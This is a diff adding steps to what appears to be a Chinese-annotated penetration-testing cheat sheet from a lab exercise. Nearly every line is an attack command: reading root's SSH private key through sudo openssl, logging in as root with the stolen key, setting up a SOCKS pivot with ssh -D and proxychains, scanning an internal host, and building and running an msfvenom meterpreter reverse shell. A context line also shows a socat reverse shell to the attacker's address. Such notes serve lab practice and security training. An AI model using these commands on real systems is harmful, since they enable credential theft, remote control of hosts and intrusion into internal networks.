@@ -215,4 +215,31 @@ socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.10.14.15:4443      �
 aureport --tty | less      读取审计日志，tty 历史
   https://linux.die.net/man/8/aureport
 
+LinPEAS - inux Privilege Escalation Awesome Script
+  https://github.com/peass-ng/PEASS-ng/tree/master/linPEAS
+
+获得长立足点
+srvadm@dmz01:~$ LFILE=/root/.ssh/id_rsa      设置路径
+srvadm@dmz01:~$ sudo /usr/bin/openssl enc -in $LFILE      屏显私钥
+复制私钥到 dmz01_key
+chmod 600 dmz01_key
+ssh -i dmz01_key root@10.129.203.111
+
+ssh -D 8081 -i dmz01_key root@10.129.203.111      从攻击机8081端口访问跳板机，再访问内网
+netstat -antp | grep 8081      查看攻击网络
+sudo vim /etc/proxychains.conf
+添加：socks4 127.0.0.1 8081 到 proxylist
+
+proxychains nmap -sT -p 21,22,80,8080 172.16.8.120      扫描内网的 172.16.8.120 （第二网卡 或 内网其它机器）
+
+用 msf 做 rs 和转发
+msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=10.10.14.15 LPORT=443 -f elf > shell.elf      生成 rs pl
+scp -i dmz01_key shell.elf root@10.129.203.111:/tmp      上传 pl
+设置 Metasploit 的 exploit/multi/handler
+root@dmz01:/tmp# chmod +x shell.elf 
+root@dmz01:/tmp# ./shell.elf
+exploit
+background
+use post/multi/manage/autoroute 
+run
 
